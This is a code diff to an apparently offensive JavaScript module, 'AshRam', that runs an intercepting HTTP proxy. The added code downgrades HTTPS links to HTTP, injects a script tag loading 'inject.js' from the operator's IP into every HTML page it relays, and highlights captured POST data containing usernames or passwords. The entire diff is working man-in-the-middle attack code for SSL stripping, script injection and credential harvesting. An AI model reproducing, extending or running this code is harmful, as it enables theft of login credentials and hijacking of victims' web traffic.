@@ -13,6 +13,24 @@ this.call = function(args, mh) {
     }
     return str;
   }
+  function getPage(url, callback) {
+    var reqgeterror = request.get(url, function(err,resget,body){
+      if(resget && resget.statusCode != 404) {
+        callback(err, resget, body);
+      } else {
+        if(url.search('http://') == -1) {
+          url = 'http://' + url;
+        }
+        var reqgeterror = request.get(replaceAll(url, 'http://', 'https://'), function(err,resget,body){
+          if(resget) {
+            callback(err, resget, body);
+          } else {
+            callback('', '', 'error');
+          }
+        });
+      }
+    });
+  }
   if(args.length == 2) {
     var http = mh.require('http');
     var request = mh.require('request');
@@ -25,6 +43,7 @@ this.call = function(args, mh) {
       } else {
         mh.clog('[AshRam] Starting AshramProxy on port '.green + ashramport.toString().green.bold + '...'.green);
         mh.varAdd('ashramproxy', http.createServer(function (req, res) {
+          //http request
           req.on('error', function() {
 
           });
@@ -35,13 +54,20 @@ this.call = function(args, mh) {
                 bodypost += chunk;
               });
               req.on('end', function () {
-                mh.clog('[AshRam] Found some post data: '.green + bodypost.toString().blue.bold);
+                if(bodypost) {
+                  bodypost = bodypost.toString();
+                  if(bodypost.search('username') != -1 || bodypost.search('password') != -1 || bodypost.search('pass') != -1 || bodypost.search('user') != -1) {
+                    mh.clog('[AshRam] Found some post data: '.green + bodypost.toString().yellow.bold);
+                  } else {
+                    mh.clog('[AshRam] Found some post data: '.green + bodypost.toString().blue.bold);
+                  }
+                }
               });
             }
             if(req.headers.accept.search('text/html') != -1) {
-              var reqgeterror = request.get(req.url, function(err,resget,body){
+              getPage(req.url, function(err,resget,body){
                 if(resget) {
-                  if(resget.headers['content-type'].search('text/html') != -1) {
+                  if(resget.headers['content-type'] && resget.headers['content-type'].search('text/html') != -1) {
                     mh.clog('[AshRam] Injecting into: '.green + req.url);
                     res.writeHead(resget.statusCode, resget.headers);
                     res.end("<script src='"+ mh.config.ip + ':' + mh.config.webport + "/inject.js'></script>" + replaceAll(body, "https://", "http://"));
@@ -65,7 +91,6 @@ this.call = function(args, mh) {
                 }
               });
               reqgeterror.on('error', function() {
-
               });
             } else {
               req.pause();
@@ -83,7 +108,6 @@ this.call = function(args, mh) {
               req.resume();
             }
           } catch(err) {
-            //mh.clog('[AshRam] '.red + err.toString().red);
           }
         }));
         mh.varRet('ashramproxy').on('connect', function(req, cltSocket, head) {
